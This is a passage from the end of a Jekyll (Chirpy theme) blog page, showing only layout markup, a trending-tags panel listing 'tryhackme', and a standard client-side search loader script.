      >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/tryhackme/">tryhackme</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

